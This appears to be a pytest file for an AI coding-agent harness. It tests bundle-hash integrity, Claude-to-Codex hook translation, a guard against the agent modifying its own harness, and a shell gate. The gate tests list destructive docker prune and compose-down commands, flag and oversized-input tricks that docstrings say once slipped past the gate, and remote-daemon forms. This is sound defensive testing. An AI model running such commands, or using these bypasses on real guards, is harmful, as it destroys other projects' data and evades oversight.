    claude = str(tmp_path / "repo" / ".claude")
    kit_source = str(tmp_path / "kit")
    _measured_bundle(claude, kit_source)
    before = hook_bundle_hash(claude)

    target = str(tmp_path / "outside")
    write(os.path.join(target, "__init__.py"), "SHADOWED = True\n")
    link = os.path.join(claude, "hooks", "yaml")
    try:
        os.symlink(target, link, target_is_directory=True)
    except (OSError, NotImplementedError) as exc:
        pytest.skip("no privilege to create a directory symlink (%s); a junction cannot stand in, "
                    "because os.path.islink() is False for one and the walk descends into it" % exc)
    assert hook_bundle_hash(claude) != before, (
        "a directory symlink planted in .claude/hooks left the bundle hash untouched - the hash is "
        "walking past links again, either in _bundle_files or in a walk of its own")
    linked = hook_bundle_hash(claude)

    # what it POINTS AT is not in the hash: adding a file behind the link must change nothing
    write(os.path.join(target, "parser.py"), "def load(s):\n    return {}\n")
    assert hook_bundle_hash(claude) == linked, (
        "the hash followed the directory link - its value now depends on a tree outside the bundle")
    # ...but the NAME is, so the same link under a different name is a different bundle
    os.rename(link, os.path.join(claude, "hooks", "json"))
    assert hook_bundle_hash(claude) != linked
    # and the scan that reports intruders agrees about what to call it
    strangers = strangers_in_the_bundle(claude, os.path.join(kit_source, "hooks"),
                                        os.path.join(kit_source, "kernel"))
    assert "hooks/json/<symlink>" in strangers, strangers


def test_a_link_to_a_file_is_one_file_to_both_halves_of_the_measurement(tmp_path):
    """One entry, one name - the flat branch and the walk branch used to disagree about a FILE link.

    `_bundle_files(flat=True)` enumerates what a scaffold copies out of `<kit>/hooks`; the walk
    enumerates what is installed. The flat branch asked bare `os.path.islink` and gave a link to a
    FILE the stand-in a DIRECTORY link gets, while the walk - which takes the answer from
    `os.walk`, i.e. from `os.path.isdir` - read it as the file it is. So a kit shipping
    `hooks/gate_b.py -> <somewhere>` had its installed copy reported as MODIFIED (the source
    contributed `gate_b.py/<symlink>`, which nothing installed can match) and as a STRANGER (the
    installed `gate_b.py` was in no shipped name) at the same time, on an installation that was
    byte-for-byte what the kit ships.
    """
    claude = str(tmp_path / "repo" / ".claude")
    kit_source = str(tmp_path / "kit")
    _measured_bundle(claude, kit_source)
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import modified_bundle_files, strangers_in_the_bundle
    kit_hooks = os.path.join(kit_source, "hooks")
    kernel_dir = os.path.join(kit_source, "kernel")

    real = str(tmp_path / "elsewhere" / "gate_b.py")
    write(real, "B = 2\n")
    try:
        os.symlink(real, os.path.join(kit_hooks, "gate_b.py"))
    except (OSError, NotImplementedError) as exc:
        pytest.skip("no privilege to create a file symlink (%s)" % exc)
    # what the scaffold's copy produces from that source: a plain file with the target's bytes
    write(os.path.join(claude, "hooks", "gate_b.py"), "B = 2\n")

    assert modified_bundle_files(kit_hooks, kernel_dir, claude) == [], (
        "an installation that is byte-for-byte the kit's is reported as modified")
    assert strangers_in_the_bundle(claude, kit_hooks, kernel_dir) == [], (
        "a file the kit ships is reported as a file the kit did not ship")
    # ...and the comparison is still a comparison: the linked source decides what "unmodified" means
    write(os.path.join(claude, "hooks", "gate_b.py"), "B = 99\n")
    assert modified_bundle_files(kit_hooks, kernel_dir, claude) == ["hooks/gate_b.py"]


def test_the_link_branches_are_measured_on_a_machine_without_symlink_privilege(tmp_path,
                                                                               monkeypatch):
    """The same two properties as the two tests above, with the OS privilege taken out of it.

    Both of them create a real symlink and `skip` when the machine refuses — so on a Windows box
    without Developer Mode, the very property whose UNCOVEREDNESS was round-6 finding 6 goes
    unmeasured again, quietly, in a suite that reports 12 skips and looks fine.

    WHAT IS SIMULATED IS THE PREDICATE, NOT THE MEASUREMENT. `_is_directory_link` is the single
    condition both branches of `_bundle_files` ask, and it is `os.path.isdir(p) and
    os.path.islink(p)`; patching `os.path.islink` to say True about one real directory and one real
    file therefore drives exactly the branches a genuine link drives, through the real
    `_bundle_files`, the real `_hash_subtrees` and the real stranger scan. `os.walk` classifies its
    entries with `scandir`, not with `os.path.islink`, so the walk still sees what is on disk.

    The two tests above remain the stronger evidence where the machine allows them: they also prove
    that the OS reports a real link the way this test assumes. This one guarantees the branches are
    never simply unmeasured.
    """
    sys.path.insert(0, TEAM_KITS)
    from kernel import hashing
    claude = str(tmp_path / "repo" / ".claude")
    kit_source = str(tmp_path / "kit")
    _measured_bundle(claude, kit_source)
    kit_hooks = os.path.join(kit_source, "hooks")
    kernel_dir = os.path.join(kit_source, "kernel")
    before = hashing.hook_bundle_hash(claude)

    declared_links = {os.path.join(claude, "hooks", "yaml"),
                      os.path.join(kit_hooks, "gate_b.py")}
    real_islink = os.path.islink
    monkeypatch.setattr(os.path, "islink",
                        lambda path: os.fspath(path) in declared_links or real_islink(path))

    # (1) a DIRECTORY that the predicate calls a link: named in the hash, not descended into
    os.makedirs(os.path.join(claude, "hooks", "yaml"))
    write(os.path.join(claude, "hooks", "yaml", "__init__.py"), "SHADOWED = True\n")
    linked = hashing.hook_bundle_hash(claude)
    assert linked != before, (
        "a directory link in .claude/hooks left the bundle hash untouched - either _bundle_files "
        "stopped yielding it or _hash_subtrees is walking on its own again")
    write(os.path.join(claude, "hooks", "yaml", "parser.py"), "def load(s):\n    return {}\n")
    assert hashing.hook_bundle_hash(claude) == linked, (
        "the measurement descended into the link - its value now depends on a tree outside the "
        "bundle")
    stand_in = "hooks/yaml/" + hashing.SYMLINK_MARKER
    assert stand_in in hashing.strangers_in_the_bundle(claude, kit_hooks, kernel_dir)

    # (2) a FILE that the predicate calls a link is a FILE to both branches: the flat branch reads
    #     the kit source, the walk reads the installation, and they must produce one name for it
    write(os.path.join(kit_hooks, "gate_b.py"), "B = 2\n")
    write(os.path.join(claude, "hooks", "gate_b.py"), "B = 2\n")
    assert hashing.modified_bundle_files(kit_hooks, kernel_dir, claude) == [], (
        "an installation that is byte-for-byte the kit's is reported as modified")
    assert [name for name in hashing.strangers_in_the_bundle(claude, kit_hooks, kernel_dir)
            if name != stand_in] == [], (
        "a file the kit ships is reported as a file the kit did not ship")
    write(os.path.join(claude, "hooks", "gate_b.py"), "B = 99\n")
    assert hashing.modified_bundle_files(kit_hooks, kernel_dir, claude) == ["hooks/gate_b.py"]


def test_recording_no_bundle_at_all_is_a_failure_not_a_success(tmp_path):
    """rc 2, not rc 0 - the difference between "recorded" and "there was nothing to record".

    Both scaffolds branch on `rc != 0`, so returning 0 here made "I recorded nothing" read to them
    as success, and the shape that reaches this branch is a plausible typo rather than an attack:
    `--repo <project>/.claude` points the recorder one level too deep, finds no bundle there, and
    used to leave a scaffold reporting success over a project with no trust record at all -
    `hook_trust` then has nothing to compare against for the life of that project.

    Asserted as 2 specifically, because the two failures a caller must be able to tell apart are
    both non-zero: 1 is "I looked and refuse", 2 is "there was nothing to look at".
    """
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    good = _kit_state(repo)["hook_bundle_hash"]

    one_level_too_deep = _record_trust(staging, repo / ".claude")
    assert one_level_too_deep.returncode == 2, (
        "the recorder reported %d for a --repo with no enforcement bundle under it; both scaffolds "
        "read anything but 0 as failure, so 0 here is a scaffold reporting success over a project "
        "it never recorded: %s"
        % (one_level_too_deep.returncode,
           one_level_too_deep.stdout + one_level_too_deep.stderr))
    assert not os.path.exists(str(repo / ".claude" / ".claude" / "kit_state.json"))
    # and the record the project really has is untouched by the failed run
    assert _kit_state(repo)["hook_bundle_hash"] == good


def _recorder_module(staging, name):
    """`write_kit_state` from a staging, as a module — so `main()` can be called with an argv."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(name, str(staging / "write_kit_state.py"))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_a_bundle_that_cannot_be_measured_is_refused_not_reported_as_absent(tmp_path, monkeypatch,
                                                                            capsys):
    """`hook_bundle_hash` answers None twice over, and the recorder used to read both as "empty".

    A subtree that does not exist and a file inside one that will not open produce the same None,
    and the single message that stood here — "no enforcement bundle under X — nothing recorded" —
    sent the reader of the second case looking for a missing installation instead of at the file
    that would not open. The exit code said the same thing: 2 is "there was nothing to look at",
    which is precisely what an unreadable bundle is not.

    Both halves are measured here. The always-running one takes the None as the INPUT it is — the
    branch under test is the recorder's classification of it, and which of the two situations
    produced it is decided from `BUNDLE_SUBTREES` against the disk. The end-to-end one plants the
    real shape, a broken link in `.claude/hooks`, wherever the machine can create one; it does not
    `skip` when it cannot, because the property is already covered by then.
    """
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    good = _kit_state(repo)["hook_bundle_hash"]

    recorder = _recorder_module(staging, "recorder_unmeasurable_probe")
    monkeypatch.setattr(recorder.kernel_hashing(), "hook_bundle_hash", lambda claude_dir: None)
    assert recorder.main(["--repo", str(repo), "--kit", "dev-team"]) == 1
    message = capsys.readouterr().err
    assert "could not be read" in message, message
    assert "nothing recorded" not in message, (
        "an unreadable bundle is reported as an absent one: %s" % message)
    assert _kit_state(repo)["hook_bundle_hash"] == good
    monkeypatch.undo()

    try:
        os.symlink(str(tmp_path / "never-existed"),
                   str(repo / ".claude" / "hooks" / "dangling.py"))
    except (OSError, NotImplementedError):
        return
    planted = _record_trust(staging, repo)
    assert planted.returncode == 1, planted.stdout + planted.stderr
    assert "could not be read" in planted.stderr, planted.stderr
    assert _kit_state(repo)["hook_bundle_hash"] == good



# -- the Claude -> Codex matcher translation (round-6 findings 8 and 9) --------


def _provider_generator(name):
    """`gen_provider_artifacts` as a module. It ships in `team-kits/`, not on the import path."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        name, os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_a_matcher_naming_two_codex_vocabularies_translates_to_both():
    """A Claude matcher names a SET of tools, so its translation is a set too.

    The old translation returned the first table entry the tool set intersected, which silently
    discarded everything after it. `Bash|Edit` became `apply_patch` alone: the shell half of that
    registration simply did not exist on Codex, in a file that reads as enforcement."""
    gpa = _provider_generator("gpa_matcher_probe")
    assert gpa.codex_matchers("Bash|Edit") == ("Bash", "apply_patch")
    assert gpa.codex_matchers("Edit|Write|MultiEdit|NotebookEdit") == ("apply_patch",)
    assert gpa.codex_matchers("Bash|PowerShell") == ("Bash",)
    # an MCP tool is spelled the same on both sides, so the name IS the translation - a branch the
    # comment and the artifact test both allowed while the code could never produce it
    assert gpa.codex_matchers("mcp__memory__search") == ("mcp__memory__search",)
    # ...and the two ways of naming nothing keep meaning "every call"
    assert gpa.codex_matchers("") == ("",)
    assert gpa.codex_matchers("*") == ("*",)


def test_an_untranslatable_tool_is_a_declared_gap_or_an_error():
    """The difference `CODEX_UNSUPPORTED_TOOLS` exists to make, and did not make while nothing
    referenced it.

    A tool Codex has no equivalent for drops out of the registration - correct, and it is exactly
    what `Agent|Task` and `AskUserQuestion` need. A tool nobody has TRANSLATED YET took the same
    exit, which is how widening two matchers to include `NotebookEdit` removed the lead's
    write-scope veto from Codex without a word. Declared gaps stay quiet; everything else stops the
    generator with the name in the message."""
    gpa = _provider_generator("gpa_gap_probe")
    for declared in sorted(gpa.CODEX_UNSUPPORTED_TOOLS):
        assert gpa.codex_matchers(declared) == (), declared
    assert gpa.codex_matchers("Agent|Task") == ()
    # ...and a tool from neither list is refused, loudly enough to act on
    with pytest.raises(SystemExit) as refused:
        gpa.codex_matchers("Agent|WebFetch")
    assert "WebFetch" in str(refused.value)
    assert "CODEX_UNSUPPORTED_TOOLS" in str(refused.value)
    # a mixed matcher still yields its translatable half, or every gap would take a gate with it
    assert gpa.codex_matchers("Agent|Task|Bash") == ("Bash",)


def test_the_specs_codex_parity_evidence_is_still_produced_by_the_generator():
    """The spec justifies two `unverified` capabilities by citing this generator — so run the cite.

    `spawn_veto` and `approval_provenance` are declared unreachable on Codex, and the argument for
    that is not prose: II.4 backs it with what `gen_provider_artifacts` does with those matchers.
    The citation read `Agent|Task → None` and stayed that way after the function stopped returning
    `None` at all — a dead reference in the paragraph that carries the parity claim, pinned by
    nothing. A citation nobody executes decays exactly like a comment nobody reads.

    So the spec now states the evidence as CALLS, and this runs them against the module:

      * every `` `codex_matchers("X") == Y` `` claim anywhere in the spec is evaluated and its
        rendering compared, so a changed return value is red in the document that depends on it;
      * every backticked `CODEX_*` name the spec cites must be an attribute of the generator, so
        the rename that produced this finding cannot happen silently a second time.

    Both loops carry a floor, because a claim that has been DELETED from the spec would otherwise
    leave this test green while the paragraph goes back to asserting the mechanism in prose."""
    gpa = _provider_generator("gpa_spec_probe")
    with open(os.path.join(ROOT, "docs", "HARNESS_V2_SPEC.md"), encoding="utf-8") as handle:
        spec = handle.read()
    calls = re.findall(r"`codex_matchers\(\"([^\"]*)\"\) == ([^`]+)`", spec)
    assert calls, ("the spec no longer executes its Codex-parity evidence — II.4 derives "
                   "spawn_veto/approval_provenance from what the generator does with those "
                   "matchers, and that has to stay a claim a test can run")
    for matcher, rendered in calls:
        assert repr(gpa.codex_matchers(matcher)) == rendered, (
            "the spec claims codex_matchers(%r) == %s, the generator answers %r"
            % (matcher, rendered, gpa.codex_matchers(matcher)))
    cited = sorted(set(re.findall(r"`(CODEX_[A-Z0-9_]+)`", spec)))
    assert cited, "the spec cites no generator constant for the declared Codex gap"
    for name in cited:
        assert hasattr(gpa, name), (
            "the spec cites %s in gen_provider_artifacts.py; no such name exists there" % name)


def test_a_shipped_mixed_matcher_reaches_codex_on_both_vocabularies():
    """The same defect in a kit that ships it, since a unit test proves only the unit.

    `gate_filing.py` is registered `Bash|PowerShell|Edit|Write|MultiEdit` - the office kit's filing
    rule applies to a shell command that moves a document exactly as it applies to writing one. On
    Codex it arrived as `apply_patch` only, so the shell half of that gate was absent on that
    provider for as long as the kit has existed."""
    gpa = _provider_generator("gpa_kit_probe")
    with open(os.path.join(TEAM_KITS, "office-team", "settings", "settings.json"),
              encoding="utf-8") as handle:
        settings = json.load(handle)
    generated = gpa.gen_codex_hooks(settings)
    triples = set()
    for event, groups in generated["hooks"].items():
        for group in groups:
            for hook in group.get("hooks", []):
                for script in _gates_in(hook.get("command", "")):
                    triples.add((event, group.get("matcher", ""), script))
    for matcher in ("Bash", "apply_patch"):
        assert ("PreToolUse", matcher, "gate_filing.py") in triples, (
            "gate_filing is registered for shell AND file tools on Claude but reaches Codex only "
            "as %s: %s" % (sorted(m for _e, m, s in triples if s == "gate_filing.py"),
                           sorted(triples)))


@pytest.mark.parametrize("kit", KITS)
def test_every_registration_a_kit_writes_survives_the_codex_translation(kit):
    """Run the generator over each kit's OWN registrations — all of them, on every event.

    The test above is the shape this repo keeps having to unlearn: one kit, one gate, two matcher
    names. It proves the unit and nothing about the other two kits, and the round that wrote it
    also turned an untranslatable tool from a silently dropped registration into a `SystemExit`.
    That trade — a quiet hole for a loud stop — is only worth making if something runs the loud
    part, and nothing ran it for research-team: adding a `WebFetch` matcher to that kit's
    settings.json kills the generator, so no Codex project scaffolds at all, and the review that
    found this measured the full suite green over exactly that mutation (2026-07-28).

    So the subject is derived twice over, from the kit rather than from a list:

      * `gen_codex_hooks` over the kit's real settings.json AND every agent's frontmatter hooks —
        the two surfaces a kit registers on, both of which reach `codex_matchers`;
      * `codex_matchers_for` over EVERY registration the kit writes anywhere, including the events
        that do not reach Codex today. That second loop is what makes the `Notification` matcher
        `agent_completed|agent_needs_input` a covered case: it is not a tool set, so running it
        through the tool table stops the generator, and the only thing preventing that has been
        `Notification` missing from `CODEX_EVENTS` — an agreement between two constants that
        nobody had written down and no test could see broken.
    """
    gpa = _provider_generator("gpa_kits_probe_" + kit.replace("-", "_"))
    with open(os.path.join(TEAM_KITS, kit, "settings", "settings.json"), encoding="utf-8") as fh:
        settings = json.load(fh)
    agents = os.path.join(TEAM_KITS, kit, "agents")
    role_hooks = []
    for name in sorted(os.listdir(agents)):
        if name.endswith(".md"):
            role_hooks.extend(gpa.agent_hook_entries(os.path.join(agents, name), name[:-3]))

    generated = gpa.gen_codex_hooks(settings, role_hooks)["hooks"]
    assert set(generated) <= set(gpa.CODEX_EVENTS), sorted(generated)
    reached = {(event, group.get("matcher", ""), script)
               for event, groups in generated.items() for group in groups
               for hook in group["hooks"] for script in _gates_in(hook["command"])}
    # A floor only against emptiness: WHICH registrations reach Codex is the generator's answer,
    # and re-deriving it here would be the same computation twice. What must not pass unnoticed is
    # a translation that produced nothing at all for a whole kit.
    assert reached, "no Codex registration was generated for %s at all" % kit

    for event, matcher, _command in _registered_commands(kit):
        gpa.codex_matchers_for(event, matcher)


# -- guard_harness_selfmod vs. the measured bundle -----------------------------

def _guard_module():
    """The running `guard_harness_selfmod`, imported as itself so its constants are the live ones."""
    return load_kit_module("guard_selfmod_probe",
                           os.path.join(HOOKS, "guard_harness_selfmod.py"))


def _bare_name_literals(path, function):
    """Every string tuple a function compares with `in`, read off the AST.

    The guard blocks the constitution pair (`AGENTS.md` / `CLAUDE.md`) from a literal INSIDE
    `check`, not from a module constant, so a reader that only imported the constants would miss
    exactly the two entries whose omission made the old comment wrong. Parsed rather than
    string-searched: this is the comparison the interpreter evaluates.
    """
    with open(path, encoding="utf-8") as handle:
        tree = ast.parse(handle.read())
    found = []
    for node in ast.walk(tree):
        if not (isinstance(node, ast.FunctionDef) and node.name == function):
            continue
        for inner in ast.walk(node):
            if isinstance(inner, ast.Compare) and any(
                    isinstance(op, ast.In) for op in inner.ops):
                for comparator in inner.comparators:
                    if isinstance(comparator, ast.Tuple) and all(
                            isinstance(e, ast.Constant) and isinstance(e.value, str)
                            for e in comparator.elts):
                        found += [e.value for e in comparator.elts]
    return found


def test_the_bundle_measures_exactly_the_two_subtrees_this_guard_shares_with_it(tmp_path):
    """Which of `guard_harness_selfmod`'s entries are INSIDE the hashed bundle — measured.

    THE CLAIM THIS REPLACES was in that guard's own comment and was false: "`scripts/` sits
    outside the measured bundle — and these two paths are the only entries in this whole file that
    do." Measured here, the ratio is the other way round: `hook_bundle_hash` walks
    `.claude/<s>` for `s` in `BUNDLE_SUBTREES`, so only the `hooks/` and `kernel/` prefixes are
    inside and everything else the guard blocks — `skills/`, `backups/`, every `BLOCKED_FILES`
    name, every provider prefix, both `BLOCKED_REPO_PATHS` and the constitution pair — is outside.

    IT IS A DERIVATION ON BOTH SIDES, which is what makes it worth running rather than reading.
    The subjects come from the guard's own constants plus the tuple its `check` compares against
    (`_bare_name_literals`, AST), the verdict "is it blocked" comes from RUNNING the guard on a
    Write payload, and "is it inside" comes from tampering with the file and recomputing the real
    hash. Nothing here restates the two subtree names except the expectation, which is read from
    `BUNDLE_SUBTREES` as well.

    WHAT GOES RED, and it is two different things on purpose: an entry the guard blocks inside a
    hashed subtree whose change does NOT move the hash (an exclusion sneaking back into the
    measurement — mutation-checked by making `_hash_subtrees` skip `kernel`, which turns the first
    assertion red), and the floor at the bottom, which is the old sentence written as a number: if
    it were true, `outside` would hold exactly the two `scripts/` paths.
    """
    guard = _guard_module()
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import BUNDLE_SUBTREES, hook_bundle_hash

    repo = pathlib.Path(str(tmp_path)) / "repo"
    claude = repo / ".claude"
    subjects = []
    for prefix in guard.BLOCKED:
        subjects.append(".claude/" + prefix + "probe_entry.py")
    for name in guard.BLOCKED_FILES:
        subjects.append(".claude/" + name)
    for prefix in guard.BLOCKED_PROVIDER_PREFIXES:
        subjects.append(prefix + "probe_entry.txt")
    subjects += list(guard.BLOCKED_REPO_PATHS)
    subjects += _bare_name_literals(os.path.join(HOOKS, "guard_harness_selfmod.py"), "check")
    assert len(subjects) >= 18, subjects

    def write(rel, text):
        target = repo / rel.replace("/", os.sep)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8")

    claude.mkdir(parents=True)
    for rel in subjects:
        write(rel, "baseline\n")
    # the two hashed subtrees must exist as real trees, or the hash is None for a missing bundle
    for subtree in BUNDLE_SUBTREES:
        (claude / subtree).mkdir(exist_ok=True)
    baseline = hook_bundle_hash(str(claude))
    assert baseline, "the fixture built no bundle to measure"

    inside, outside, waved_through = [], [], []
    for rel in subjects:
        payload = {"tool_name": "Write", "hook_event_name": "PreToolUse",
                   "tool_input": {"file_path": str(repo / rel.replace("/", os.sep))},
                   "cwd": str(repo)}
        blocked = run_hook("guard_harness_selfmod.py", payload, repo).returncode == 2
        if not blocked:
            waved_through.append(rel)
        write(rel, "TAMPERED\n")
        (inside if hook_bundle_hash(str(claude)) != baseline else outside).append(rel)
        write(rel, "baseline\n")
        assert hook_bundle_hash(str(claude)) == baseline, rel

    assert not waved_through, (
        "the guard did not refuse a write to %s, although its own constants name it" % waved_through)
    expected_inside = sorted(rel for rel in subjects
                             if any(rel.startswith(".claude/" + s + "/") for s in BUNDLE_SUBTREES))
    assert sorted(inside) == expected_inside, (
        "the hashed bundle and this guard disagree about which paths are measured: the hash moved "
        "for %s, `BUNDLE_SUBTREES` %s says it should move for %s"
        % (sorted(inside), BUNDLE_SUBTREES, expected_inside))
    assert len(outside) > 2, (
        "only %s of this guard's entries sit outside the measured bundle — the comment that "
        "claimed exactly the two `scripts/` paths do would then have been right, and it was the "
        "reason this test exists" % outside)
    assert [rel for rel in outside
            if not rel.startswith(".claude/") and not rel.startswith("scripts/")], (
        "every blocked path outside the bundle is either under .claude or under scripts/ — the "
        "narrow reading of the old claim would hold, and the constitution pair plus the provider "
        "prefixes are what disproves it")


@pytest.mark.parametrize("command", [
    # a global option standing where the old pattern expected the verb -- all three measured
    # ALLOWED as real hook processes on 2026-07-31, while the bare `docker system prune -af` was
    # refused one word away
    "docker --context remote system prune -af",
    "docker -H tcp://x:2375 system prune -af",
    "docker --log-level debug volume prune",
    "docker --config /tmp/dc system prune",
])
def test_a_docker_global_option_is_not_a_bypass_of_the_prune_ban(tmp_path, command):
    """R10's prune half. A prune reaches every project on the daemon by construction, so the ban
    is unconditional — and an unconditional ban that any `--flag` walks past is not one."""
    work = hygiene_repo(tmp_path)
    result = run_hygiene(work, command)
    assert result.returncode == 2, (command, result.stderr)
    assert "WHOLE daemon" in result.stderr


@pytest.mark.parametrize("command", [
    "docker compose -p other down",
    "docker compose -p other stop",
    "docker compose --project-name other down",
    "docker compose --project-name=other rm -f",
])
def test_a_foreign_compose_project_named_on_the_command_line_is_refused(tmp_path, command):
    """The half of R10 that needs no daemon, and the half that did not exist.

    `-p <name>` is compose's OWN way of naming a project, so `docker compose -p other down` says
    outright that it reaches a stack that is not this repo's — the reader is not guessing. Before
    this the flag stood where the destructive-verb pattern expected the verb, so the command
    matched nothing at all and ran (measured rc 0).

    Deliberately measured on a machine with no docker daemon: a project named on the command line
    is foreign whether or not docker is running, and the previous rule could only ever answer this
    question by asking `docker inspect`.
    """
    work = hygiene_repo(tmp_path)
    result = run_hygiene(work, command)
    assert result.returncode == 2, (command, result.stderr)
    assert "compose project 'other'" in result.stderr


@pytest.mark.parametrize("command", [
    # THE COUNTER-BATTERY: ordinary docker work, including this project's OWN compose project by
    # name, and the one `-p` that means a port rather than a project.
    "docker compose -p myproject down",
    "docker compose down",
    "docker compose up -d",
    "docker ps -a",
    "docker build -t app .",
    "docker run -d -p 8080:80 nginx",
    "docker logs -f api",
    "docker inspect api",
    "docker exec api rm -rf /tmp/cache",
])
def test_ordinary_docker_work_stays_open(tmp_path, command):
    """A gate that blocks diagnosis gets worked around, and the widening above is only affordable
    because reading, building, running and this project's own compose stack are untouched. The
    repo directory is `myproject`, which is what compose defaults its project name to."""
    work = hygiene_repo(tmp_path)
    result = run_hygiene(work, command)
    assert result.returncode == 0, (command, result.stderr)


def test_a_container_name_keeps_its_case_on_the_way_to_the_daemon(tmp_path, monkeypatch):
    """R10's target check hands the name STRAIGHT to `docker inspect`, and container names are
    case-sensitive.

    The conversion to `_compat.docker_invocations` took the reader's default (`lower=True`) and
    lost that; the docstring which had said "Case is PRESERVED: a container name is case-sensitive
    and goes straight into `docker inspect`" was deleted with the code it described. Measured with
    a docker shim logging its argv: `docker rm OtherDB` reached the probe as
    `inspect … otherdb`, the daemon answered "No such object", `_compose_project_of` returned None,
    and this gate reads None as "the command will fail on its own" and ALLOWS. HEAD refused it.

    Only the DAEMON is stubbed here — there is none on a test machine or a CI runner, which is why
    the daemon-free half of R10 (`-p <project>`) exists at all. Everything between the command text
    and the block runs: the reader, the verb search, the target extraction and `_check_docker`.
    """
    hygiene = load_kit_module("gate_shell_hygiene_case", HYGIENE_GATE)
    work = hygiene_repo(tmp_path)
    asked = []

    def daemon(root, name):
        asked.append(name)
        return "neighbour-stack" if name == "OtherDB" else None

    monkeypatch.setattr(hygiene, "_compose_project_of", daemon)
    with pytest.raises(SystemExit) as stopped:
        hygiene._check_docker(str(work), "docker rm OtherDB")
    assert stopped.value.code == 2
    assert asked == ["OtherDB"], (
        "the gate probed the daemon for %r — a container the user did not name" % asked)

    asked[:] = []
    hygiene._check_docker(str(work), "docker stop otherdb")      # a different container: allowed
    assert asked == ["otherdb"]


def test_a_docker_command_too_long_to_read_is_not_read_as_harmless(tmp_path):
    """`GIT_READ_LIMIT`'s own contract, applied to the rule the conversion attached to that reader.

    Over the limit `_compat.docker_invocations` answers with ONE unresolved invocation carrying no
    text, so the verb search has nothing to search and every R10 rule falls silent. HEAD had no
    such hole -- its regex ran over `git_argument_text`, which returns the raw command over the
    limit. Measured on a 524 329-byte command ending in `; docker system prune -af`: HEAD rc 2, the
    converted gate rc 0. That is a regression of THIS round, found by asking what the new reader
    makes reachable rather than whether the old cases still block.

    The accepted cost is stated rather than hidden: over the limit a READ-ONLY docker command is
    refused too (`docker ps` at that size), because at that point the gate cannot tell one from the
    other -- and the remedy is to run the docker step as its own short command. An oversized
    command that does not name docker at all is untouched, which is what keeps this rule about
    docker.
    """
    work = hygiene_repo(tmp_path)
    padding = "x" * (_compat.GIT_READ_LIMIT + 10)
    refused = run_hygiene(work, "echo " + padding + " ; docker system prune -af")
    assert refused.returncode == 2, refused.stderr
    assert "too long" not in refused.stderr and "past the" in refused.stderr
    assert run_hygiene(work, "echo " + padding + " ; docker ps -a").returncode == 2
    assert run_hygiene(work, "echo " + padding + " ; ls -la").returncode == 0
